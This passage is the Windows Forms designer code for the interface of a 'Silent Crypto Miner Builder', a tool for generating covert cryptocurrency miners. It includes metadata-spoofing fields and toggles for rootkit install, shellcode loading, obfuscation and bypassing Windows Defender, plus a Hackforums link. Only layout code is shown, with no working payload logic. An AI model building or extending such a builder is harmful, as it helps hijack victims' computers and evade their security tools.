            this.txtAssemblyVersion2.Size = new System.Drawing.Size(23, 24);
            this.txtAssemblyVersion2.TabIndex = 3;
            this.txtAssemblyVersion2.Text = "0";
            this.txtAssemblyVersion2.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion2.UseSystemPasswordChar = false;
            this.txtAssemblyVersion2.WordWrap = false;
            // 
            // txtAssemblyCompany
            // 
            this.txtAssemblyCompany.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyCompany.Enabled = false;
            this.txtAssemblyCompany.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyCompany.Location = new System.Drawing.Point(14, 119);
            this.txtAssemblyCompany.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyCompany.MaxLength = 32767;
            this.txtAssemblyCompany.MultiLine = false;
            this.txtAssemblyCompany.Name = "txtAssemblyCompany";
            this.txtAssemblyCompany.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyCompany.TabIndex = 0;
            this.txtAssemblyCompany.Text = "Company...";
            this.txtAssemblyCompany.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyCompany.UseSystemPasswordChar = false;
            this.txtAssemblyCompany.WordWrap = false;
            // 
            // txtAssemblyVersion1
            // 
            this.txtAssemblyVersion1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyVersion1.Enabled = false;
            this.txtAssemblyVersion1.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyVersion1.Location = new System.Drawing.Point(87, 157);
            this.txtAssemblyVersion1.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyVersion1.MaxLength = 32767;
            this.txtAssemblyVersion1.MultiLine = false;
            this.txtAssemblyVersion1.Name = "txtAssemblyVersion1";
            this.txtAssemblyVersion1.Size = new System.Drawing.Size(23, 24);
            this.txtAssemblyVersion1.TabIndex = 4;
            this.txtAssemblyVersion1.Text = "0";
            this.txtAssemblyVersion1.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyVersion1.UseSystemPasswordChar = false;
            this.txtAssemblyVersion1.WordWrap = false;
            // 
            // txtAssemblyTrademark
            // 
            this.txtAssemblyTrademark.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAssemblyTrademark.Enabled = false;
            this.txtAssemblyTrademark.ForeColor = System.Drawing.Color.Silver;
            this.txtAssemblyTrademark.Location = new System.Drawing.Point(230, 119);
            this.txtAssemblyTrademark.Margin = new System.Windows.Forms.Padding(2);
            this.txtAssemblyTrademark.MaxLength = 32767;
            this.txtAssemblyTrademark.MultiLine = false;
            this.txtAssemblyTrademark.Name = "txtAssemblyTrademark";
            this.txtAssemblyTrademark.Size = new System.Drawing.Size(176, 24);
            this.txtAssemblyTrademark.TabIndex = 0;
            this.txtAssemblyTrademark.Text = "Trademark...";
            this.txtAssemblyTrademark.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAssemblyTrademark.UseSystemPasswordChar = false;
            this.txtAssemblyTrademark.WordWrap = false;
            // 
            // TabPage4
            // 
            this.TabPage4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.TabPage4.Controls.Add(this.chkIcon);
            this.TabPage4.Controls.Add(this.picIcon);
            this.TabPage4.Controls.Add(this.btnBrowseIcon);
            this.TabPage4.Controls.Add(this.txtIconPath);
            this.TabPage4.Location = new System.Drawing.Point(89, 4);
            this.TabPage4.Name = "TabPage4";
            this.TabPage4.Size = new System.Drawing.Size(418, 189);
            this.TabPage4.TabIndex = 3;
            this.TabPage4.Text = "Icon";
            // 
            // chkIcon
            // 
            this.chkIcon.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkIcon.BackColor = System.Drawing.Color.Transparent;
            this.chkIcon.Checked = false;
            this.chkIcon.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkIcon.ForeColor = System.Drawing.Color.Black;
            this.chkIcon.Location = new System.Drawing.Point(14, 12);
            this.chkIcon.Margin = new System.Windows.Forms.Padding(2);
            this.chkIcon.Name = "chkIcon";
            this.chkIcon.Size = new System.Drawing.Size(111, 24);
            this.chkIcon.TabIndex = 21;
            this.chkIcon.Text = "Disabled";
            this.chkIcon.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkIcon_CheckedChanged);
            // 
            // picIcon
            // 
            this.picIcon.ErrorImage = null;
            this.picIcon.Image = global::SilentCryptoMiner.Properties.Resources.icon1;
            this.picIcon.InitialImage = null;
            this.picIcon.Location = new System.Drawing.Point(160, 81);
            this.picIcon.Margin = new System.Windows.Forms.Padding(2);
            this.picIcon.Name = "picIcon";
            this.picIcon.Size = new System.Drawing.Size(96, 96);
            this.picIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.picIcon.TabIndex = 11;
            this.picIcon.TabStop = false;
            // 
            // btnBrowseIcon
            // 
            this.btnBrowseIcon.BackColor = System.Drawing.Color.Transparent;
            this.btnBrowseIcon.Enabled = false;
            this.btnBrowseIcon.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnBrowseIcon.Location = new System.Drawing.Point(14, 48);
            this.btnBrowseIcon.Margin = new System.Windows.Forms.Padding(2);
            this.btnBrowseIcon.Name = "btnBrowseIcon";
            this.btnBrowseIcon.Size = new System.Drawing.Size(69, 25);
            this.btnBrowseIcon.TabIndex = 9;
            this.btnBrowseIcon.Text = "Browse";
            this.btnBrowseIcon.Click += new System.EventHandler(this.btnBrowseIcon_Click);
            // 
            // txtIconPath
            // 
            this.txtIconPath.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtIconPath.ForeColor = System.Drawing.Color.Silver;
            this.txtIconPath.Location = new System.Drawing.Point(87, 49);
            this.txtIconPath.Margin = new System.Windows.Forms.Padding(2);
            this.txtIconPath.MaxLength = 32767;
            this.txtIconPath.MultiLine = false;
            this.txtIconPath.Name = "txtIconPath";
            this.txtIconPath.Size = new System.Drawing.Size(302, 24);
            this.txtIconPath.TabIndex = 10;
            this.txtIconPath.Text = "Path to icon...";
            this.txtIconPath.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtIconPath.UseSystemPasswordChar = false;
            this.txtIconPath.WordWrap = false;
            // 
            // TabPage6
            // 
            this.TabPage6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.TabPage6.Controls.Add(this.pictureBox2);
            this.TabPage6.Controls.Add(this.labelOptionRootkit);
            this.TabPage6.Controls.Add(this.toggleRootkit);
            this.TabPage6.Controls.Add(this.labelOptionShellcode);
            this.TabPage6.Controls.Add(this.toggleShellcode);
            this.TabPage6.Controls.Add(this.labelOptionAdministrator);
            this.TabPage6.Controls.Add(this.toggleAdministrator);
            this.TabPage6.Controls.Add(this.PictureBox1);
            this.TabPage6.Controls.Add(this.labelOptionDebug);
            this.TabPage6.Controls.Add(this.toggleDebug);
            this.TabPage6.Controls.Add(this.labelOptionObfuscation);
            this.TabPage6.Controls.Add(this.toggleObfuscation);
            this.TabPage6.Controls.Add(this.labelOptionWD);
            this.TabPage6.Controls.Add(this.toggleKillWD);
            this.TabPage6.Location = new System.Drawing.Point(89, 4);
            this.TabPage6.Name = "TabPage6";
            this.TabPage6.Padding = new System.Windows.Forms.Padding(3);
            this.TabPage6.Size = new System.Drawing.Size(418, 189);
            this.TabPage6.TabIndex = 5;
            this.TabPage6.Text = "Options";
            // 
            // pictureBox2
            // 
            this.pictureBox2.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox2.Image = global::SilentCryptoMiner.Properties.Resources.microsoft_admin;
            this.pictureBox2.Location = new System.Drawing.Point(235, 132);
            this.pictureBox2.Name = "pictureBox2";
            this.pictureBox2.Size = new System.Drawing.Size(20, 20);
            this.pictureBox2.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox2.TabIndex = 107;
            this.pictureBox2.TabStop = false;
            // 
            // labelOptionRootkit
            // 
            this.labelOptionRootkit.AutoSize = true;
            this.labelOptionRootkit.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionRootkit.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionRootkit.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.labelOptionRootkit.Location = new System.Drawing.Point(9, 134);
            this.labelOptionRootkit.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionRootkit.Name = "labelOptionRootkit";
            this.labelOptionRootkit.Size = new System.Drawing.Size(89, 17);
            this.labelOptionRootkit.TabIndex = 105;
            this.labelOptionRootkit.Text = "Install Rootkit:";
            // 
            // toggleRootkit
            // 
            this.toggleRootkit.BackColor = System.Drawing.Color.Transparent;
            this.toggleRootkit.Checked = false;
            this.toggleRootkit.ForeColor = System.Drawing.Color.Black;
            this.toggleRootkit.Location = new System.Drawing.Point(180, 130);
            this.toggleRootkit.Margin = new System.Windows.Forms.Padding(2);
            this.toggleRootkit.Name = "toggleRootkit";
            this.toggleRootkit.Size = new System.Drawing.Size(50, 24);
            this.toggleRootkit.TabIndex = 104;
            this.toggleRootkit.Text = "Enable Nicehash Mining";
            // 
            // labelOptionShellcode
            // 
            this.labelOptionShellcode.AutoSize = true;
            this.labelOptionShellcode.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionShellcode.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionShellcode.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionShellcode.Location = new System.Drawing.Point(10, 92);
            this.labelOptionShellcode.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionShellcode.Name = "labelOptionShellcode";
            this.labelOptionShellcode.Size = new System.Drawing.Size(112, 17);
            this.labelOptionShellcode.TabIndex = 102;
            this.labelOptionShellcode.Text = "Shellcode Loader:";
            // 
            // toggleShellcode
            // 
            this.toggleShellcode.BackColor = System.Drawing.Color.Transparent;
            this.toggleShellcode.Checked = true;
            this.toggleShellcode.ForeColor = System.Drawing.Color.Black;
            this.toggleShellcode.Location = new System.Drawing.Point(180, 90);
            this.toggleShellcode.Margin = new System.Windows.Forms.Padding(2);
            this.toggleShellcode.Name = "toggleShellcode";
            this.toggleShellcode.Size = new System.Drawing.Size(50, 24);
            this.toggleShellcode.TabIndex = 101;
            this.toggleShellcode.Text = "Enable Nicehash Mining";
            // 
            // labelOptionAdministrator
            // 
            this.labelOptionAdministrator.AutoSize = true;
            this.labelOptionAdministrator.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionAdministrator.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionAdministrator.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionAdministrator.Location = new System.Drawing.Point(9, 38);
            this.labelOptionAdministrator.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionAdministrator.Name = "labelOptionAdministrator";
            this.labelOptionAdministrator.Size = new System.Drawing.Size(133, 17);
            this.labelOptionAdministrator.TabIndex = 99;
            this.labelOptionAdministrator.Text = "Run as Administrator:";
            // 
            // toggleAdministrator
            // 
            this.toggleAdministrator.BackColor = System.Drawing.Color.Transparent;
            this.toggleAdministrator.Checked = false;
            this.toggleAdministrator.ForeColor = System.Drawing.Color.Black;
            this.toggleAdministrator.Location = new System.Drawing.Point(180, 34);
            this.toggleAdministrator.Margin = new System.Windows.Forms.Padding(2);
            this.toggleAdministrator.Name = "toggleAdministrator";
            this.toggleAdministrator.Size = new System.Drawing.Size(50, 24);
            this.toggleAdministrator.TabIndex = 98;
            this.toggleAdministrator.Text = "Enable Nicehash Mining";
            // 
            // PictureBox1
            // 
            this.PictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.PictureBox1.Image = global::SilentCryptoMiner.Properties.Resources.microsoft_admin;
            this.PictureBox1.Location = new System.Drawing.Point(235, 65);
            this.PictureBox1.Name = "PictureBox1";
            this.PictureBox1.Size = new System.Drawing.Size(20, 20);
            this.PictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.PictureBox1.TabIndex = 97;
            this.PictureBox1.TabStop = false;
            // 
            // labelOptionDebug
            // 
            this.labelOptionDebug.AutoSize = true;
            this.labelOptionDebug.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionDebug.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionDebug.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(192)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            this.labelOptionDebug.Location = new System.Drawing.Point(10, 160);
            this.labelOptionDebug.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionDebug.Name = "labelOptionDebug";
            this.labelOptionDebug.Size = new System.Drawing.Size(52, 17);
            this.labelOptionDebug.TabIndex = 86;
            this.labelOptionDebug.Text = "DEBUG:";
            // 
            // toggleDebug
            // 
            this.toggleDebug.BackColor = System.Drawing.Color.Transparent;
            this.toggleDebug.Checked = false;
            this.toggleDebug.ForeColor = System.Drawing.Color.Black;
            this.toggleDebug.Location = new System.Drawing.Point(180, 158);
            this.toggleDebug.Margin = new System.Windows.Forms.Padding(2);
            this.toggleDebug.Name = "toggleDebug";
            this.toggleDebug.Size = new System.Drawing.Size(50, 24);
            this.toggleDebug.TabIndex = 85;
            this.toggleDebug.Text = "Enable Nicehash Mining";
            // 
            // labelOptionObfuscation
            // 
            this.labelOptionObfuscation.AutoSize = true;
            this.labelOptionObfuscation.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionObfuscation.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionObfuscation.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionObfuscation.Location = new System.Drawing.Point(9, 10);
            this.labelOptionObfuscation.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionObfuscation.Name = "labelOptionObfuscation";
            this.labelOptionObfuscation.Size = new System.Drawing.Size(140, 17);
            this.labelOptionObfuscation.TabIndex = 89;
            this.labelOptionObfuscation.Text = "Pause for Obfuscation:";
            // 
            // toggleObfuscation
            // 
            this.toggleObfuscation.BackColor = System.Drawing.Color.Transparent;
            this.toggleObfuscation.Checked = false;
            this.toggleObfuscation.ForeColor = System.Drawing.Color.Black;
            this.toggleObfuscation.Location = new System.Drawing.Point(180, 6);
            this.toggleObfuscation.Margin = new System.Windows.Forms.Padding(2);
            this.toggleObfuscation.Name = "toggleObfuscation";
            this.toggleObfuscation.Size = new System.Drawing.Size(50, 24);
            this.toggleObfuscation.TabIndex = 88;
            this.toggleObfuscation.Text = "Enable Nicehash Mining";
            // 
            // labelOptionWD
            // 
            this.labelOptionWD.AutoSize = true;
            this.labelOptionWD.BackColor = System.Drawing.Color.Transparent;
            this.labelOptionWD.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelOptionWD.ForeColor = System.Drawing.Color.Gray;
            this.labelOptionWD.Location = new System.Drawing.Point(9, 65);
            this.labelOptionWD.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelOptionWD.Name = "labelOptionWD";
            this.labelOptionWD.Size = new System.Drawing.Size(166, 17);
            this.labelOptionWD.TabIndex = 92;
            this.labelOptionWD.Text = "Bypass Windows Defender:";
            // 
            // toggleKillWD
            // 
            this.toggleKillWD.BackColor = System.Drawing.Color.Transparent;
            this.toggleKillWD.Checked = false;
            this.toggleKillWD.ForeColor = System.Drawing.Color.Black;
            this.toggleKillWD.Location = new System.Drawing.Point(180, 62);
            this.toggleKillWD.Margin = new System.Windows.Forms.Padding(2);
            this.toggleKillWD.Name = "toggleKillWD";
            this.toggleKillWD.Size = new System.Drawing.Size(50, 24);
            this.toggleKillWD.TabIndex = 91;
            this.toggleKillWD.Text = "Enable Nicehash Mining";
            // 
            // TabPage5
            // 
            this.TabPage5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.TabPage5.Controls.Add(this.labelSeconds);
            this.TabPage5.Controls.Add(this.labelStartDelay);
            this.TabPage5.Controls.Add(this.txtStartDelay);
            this.TabPage5.Controls.Add(this.labelHackforums);
            this.TabPage5.Controls.Add(this.labelGitHub);
            this.TabPage5.Controls.Add(this.txtLog);
            this.TabPage5.Controls.Add(this.btnBuild);
            this.TabPage5.Location = new System.Drawing.Point(89, 4);
            this.TabPage5.Name = "TabPage5";
            this.TabPage5.Size = new System.Drawing.Size(418, 189);
            this.TabPage5.TabIndex = 4;
            this.TabPage5.Text = "Build";
            // 
            // labelSeconds
            // 
            this.labelSeconds.AutoSize = true;
            this.labelSeconds.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelSeconds.Location = new System.Drawing.Point(121, 11);
            this.labelSeconds.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelSeconds.Name = "labelSeconds";
            this.labelSeconds.Size = new System.Drawing.Size(57, 17);
            this.labelSeconds.TabIndex = 57;
            this.labelSeconds.Text = "Seconds";
            // 
            // labelStartDelay
            // 
            this.labelStartDelay.AutoSize = true;
            this.labelStartDelay.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.labelStartDelay.Location = new System.Drawing.Point(10, 11);
            this.labelStartDelay.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelStartDelay.Name = "labelStartDelay";
            this.labelStartDelay.Size = new System.Drawing.Size(74, 17);
            this.labelStartDelay.TabIndex = 56;
            this.labelStartDelay.Text = "Start Delay:";
            // 
            // txtStartDelay
            // 
            this.txtStartDelay.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtStartDelay.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtStartDelay.ForeColor = System.Drawing.Color.Silver;
            this.txtStartDelay.Location = new System.Drawing.Point(85, 9);
            this.txtStartDelay.MaxLength = 32767;
            this.txtStartDelay.MultiLine = false;
            this.txtStartDelay.Name = "txtStartDelay";
            this.txtStartDelay.Size = new System.Drawing.Size(34, 24);
            this.txtStartDelay.TabIndex = 55;
            this.txtStartDelay.Text = "15";
            this.txtStartDelay.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtStartDelay.UseSystemPasswordChar = false;
            this.txtStartDelay.WordWrap = false;
            // 
            // labelHackforums
            // 
            this.labelHackforums.AutoSize = true;
            this.labelHackforums.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.labelHackforums.Location = new System.Drawing.Point(57, 167);
            this.labelHackforums.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelHackforums.Name = "labelHackforums";
            this.labelHackforums.Size = new System.Drawing.Size(77, 17);
            this.labelHackforums.TabIndex = 22;
            this.labelHackforums.TabStop = true;
            this.labelHackforums.Text = "Hackforums";
            this.labelHackforums.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.labelHackforums_LinkClicked);
            // 
            // labelGitHub
            // 
            this.labelGitHub.AutoSize = true;
            this.labelGitHub.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.labelGitHub.Location = new System.Drawing.Point(8, 167);
            this.labelGitHub.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.labelGitHub.Name = "labelGitHub";
            this.labelGitHub.Size = new System.Drawing.Size(48, 17);
            this.labelGitHub.TabIndex = 21;
            this.labelGitHub.TabStop = true;
            this.labelGitHub.Text = "GitHub";
            this.labelGitHub.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.labelGitHub_LinkClicked);
            // 
            // txtLog
            // 
            this.txtLog.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtLog.Font = new System.Drawing.Font("Segoe UI", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtLog.ForeColor = System.Drawing.Color.Silver;
            this.txtLog.Location = new System.Drawing.Point(10, 41);
            this.txtLog.Margin = new System.Windows.Forms.Padding(2);
            this.txtLog.MaxLength = 32767;
            this.txtLog.MultiLine = true;
            this.txtLog.Name = "txtLog";
            this.txtLog.Size = new System.Drawing.Size(399, 119);
            this.txtLog.TabIndex = 18;
            this.txtLog.Text = "Output...";
            this.txtLog.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtLog.UseSystemPasswordChar = false;
            this.txtLog.WordWrap = false;
            // 
            // btnBuild
            // 
            this.btnBuild.BackColor = System.Drawing.Color.Transparent;
            this.btnBuild.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(205)))), ((int)(((byte)(205)))), ((int)(((byte)(205)))));
            this.btnBuild.Location = new System.Drawing.Point(309, 9);
            this.btnBuild.Margin = new System.Windows.Forms.Padding(2);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.Size = new System.Drawing.Size(99, 25);
            this.btnBuild.TabIndex = 17;
            this.btnBuild.Text = "Build";
            this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
            // 
            // Builder
            // 
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.None;
            this.ClientSize = new System.Drawing.Size(535, 272);
            this.Controls.Add(this.formBuilder);
            this.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(2);
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(535, 272);
            this.MinimizeBox = false;
            this.MinimumSize = new System.Drawing.Size(535, 272);
            this.Name = "Builder";
            this.Opacity = 0.95D;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Silent Crypto Miner Builder";
            this.TransparencyKey = System.Drawing.Color.Fuchsia;
            this.Load += new System.EventHandler(this.Form1_Load);
            this.formBuilder.ResumeLayout(false);
            this.MephTabcontrol2.ResumeLayout(false);
            this.TabPage1.ResumeLayout(false);
            this.TabPage1.PerformLayout();
            this.TabPage2.ResumeLayout(false);
            this.TabPage2.PerformLayout();
            this.TabPage3.ResumeLayout(false);
            this.TabPage3.PerformLayout();
            this.TabPage4.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.picIcon)).EndInit();
            this.TabPage6.ResumeLayout(false);
            this.TabPage6.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox2)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).EndInit();
            this.TabPage5.ResumeLayout(false);
            this.TabPage5.PerformLayout();
            this.ResumeLayout(false);

        }

        internal MephTheme formBuilder;
        internal System.ComponentModel.BackgroundWorker BackgroundWorker2;
        internal MephButton btnAssemblyRandom;
        internal MephButton btnAssemblyClone;
        internal MephTextBox txtAssemblyVersion4;
        internal MephTextBox txtAssemblyVersion3;
        internal MephTextBox txtAssemblyVersion2;
        internal MephTextBox txtAssemblyVersion1;
        internal MephTextBox txtAssemblyTrademark;
        internal MephTextBox txtAssemblyCompany;
        internal MephTextBox txtAssemblyCopyright;
        internal MephTextBox txtAssemblyDescription;
        internal MephTextBox txtAssemblyProduct;
        internal MephTextBox txtAssemblyTitle;
        internal MephTextBox txtIconPath;
        internal MephButton btnBrowseIcon;
        internal MephTextBox txtInstallFileName;
        internal Label labelStartupFilename;
        internal PictureBox picIcon;
        internal Label labelStartupSavePath;
        internal MephComboBox txtInstallPath;
        internal MephCheckBox chkAssembly;
        internal MephCheckBox chkIcon;
        internal MephCheckBox chkInstall;
        internal MephTabcontrol MephTabcontrol2;
        internal TabPage TabPage1;
        internal TabPage TabPage2;
        internal TabPage TabPage3;
        internal TabPage TabPage4;
        internal TabPage TabPage5;
        internal MephTextBox txtLog;
        internal MephButton btnBuild;
        internal Label labelAssemblyVersion;
        internal LinkLabel labelHackforums;
        internal LinkLabel labelGitHub;
        internal Label labelSeconds;
        internal Label labelStartDelay;
        internal MephTextBox txtStartDelay;
        internal Label labelStartupWatchdog;
        internal MephToggleSwitch toggleWatchdog;
        internal Label labelHelp;
        internal LinkLabel labelWiki;
        internal MephButton btnMinerRemove;
        internal MephButton btnMinerEdit;
        internal MephButton btnMinerAdd;
        internal Label labelMiners;
        internal TabPage TabPage6;
        internal Label labelOptionAdministrator;
        internal MephToggleSwitch toggleAdministrator;
        internal PictureBox PictureBox1;
        internal Label labelOptionDebug;
        internal MephToggleSwitch toggleDebug;
        internal Label labelOptionObfuscation;
        internal MephToggleSwitch toggleObfuscation;
        internal Label labelOptionWD;
        internal MephToggleSwitch toggleKillWD;
        internal MephListBox listMiners;
        internal Label labelOptionShellcode;
        internal MephToggleSwitch toggleShellcode;
        internal PictureBox pictureBox2;
        internal Label labelOptionRootkit;
        internal MephToggleSwitch toggleRootkit;
        internal MephButton btnLoadState;
        internal MephButton btnSaveState;
        internal Label labelLang;
        internal MephComboBox mephComboBox1;
    }
}